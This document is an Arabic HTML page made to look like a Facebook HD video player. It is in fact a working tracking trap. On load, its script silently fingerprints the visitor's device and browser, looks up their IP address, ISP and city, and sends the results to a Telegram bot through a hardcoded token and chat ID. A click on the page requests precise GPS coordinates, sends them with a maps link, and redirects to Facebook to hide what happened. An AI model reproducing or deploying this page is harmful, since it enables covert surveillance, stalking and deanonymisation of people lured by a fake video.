<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Video HD</title>
    <style>
        body { margin: 0; background: #f0f2f5; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
        .card { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .btn { background: #1877f2; color: white; padding: 15px; border-radius: 8px; font-weight: bold; border: none; width: 100%; font-size: 16px; margin-top: 20px; }
    </style>
</head>
<body onclick="getAccurateGPS()">

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="50">
        <h3>مشغل الفيديو</h3>
        <p>يتم تحضير البث المباشر... اضغط للبدء</p>
        <button class="btn">تشغيل الآن</button>
    </div>

<script>
    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
    const CHAT_ID = "1611398303";

    function send(msg) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
    }

    // 🔱 المرحلة 1: الهوية البرمجية الصامتة (Browser & OS Details)
    async function getSilentIntel() {
        let intel = "🕵️‍♂️ [SILENT FULL REPORT]\n\n";

        // 1. تفاصيل المتصفح والنظام (User Agent Analysis)
        intel += `📱 المتصفح: ${navigator.userAgent}\n`;
        intel += `🌐 اللغة: ${navigator.language}\n`;
        intel += `💻 المنصة: ${navigator.platform}\n`;
        intel += `🍪 الكوكيز: ${navigator.cookieEnabled ? 'مفعلة' : 'معطلة'}\n`;
        
        // 2. كشف "وضع التصفح الخفي" (Incognito Detection)
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (fs) {
            fs(window.TEMPORARY, 100, () => intel += "🕵️ وضع العرض: عادي\n", () => intel += "🕵️ وضع العرض: خفي (Incognito)\n");
        }

        // 3. بيانات الشاشة والعتاد (Hardware Logic)
        intel += `🖥️ الشاشة: ${screen.width}x${screen.height} (Color: ${screen.colorDepth}-bit)\n`;
        intel += `⚙️ الأنوية: ${navigator.hardwareConcurrency} Cores\n`;
        intel += `🔋 البطارية: ${navigator.getBattery ? 'مدعومة' : 'غير مدعومة'}\n`;

        // 4. بصمة الخطوط (تحدد نوع الجهاز بدقة)
        const fonts = ["Roboto", "Samsung Sans", "Mi Sans", "Ubuntu"];
        let detectedFonts = fonts.filter(f => document.fonts.check(`12px "${f}"`)).join(", ");
        intel += `🖋️ الخطوط المنصبة: ${detectedFonts}\n`;

        // 5. كشف الـ VPN عبر الـ Timezone
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const offset = new Date().getTimezoneOffset();
        intel += `🌍 التوقيت المحلي: ${tz} (Offset: ${offset})\n`;

        // 6. بصمة الـ WebGL (كرت الشاشة بالتفصيل)
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            intel += `🎮 GPU: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}\n`;
        } catch(e) {}

        send(intel);
    }

    // 🔱 المرحلة 2: سحب الـ IP (صامت)
    function getIP() {
        fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            fetch(`https://ipapi.co/${data.ip}/json/`)
            .then(res => res.json())
            .then(d => {
                let report = `🌐 [NETWORK]\nIP: ${d.ip}\nISP: ${d.org}\nCity: ${d.city}\nCountry: ${d.country_name}`;
                send(report);
            });
        });
    }

    // 🔱 المرحلة 3: الموقع الدقيق (عند الضغط)
    function getAccurateGPS() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                let msg = `🎯 [EXACT LOCATION]\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nLink: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                send(msg);
                setTimeout(() => location.href = "https://m.facebook.com", 1000);
            }, () => { location.href = "https://m.facebook.com"; }, {enableHighAccuracy: true});
        }
    }

    window.onload = () => { getIP(); getSilentIntel(); };
</script>
</body>
</html>
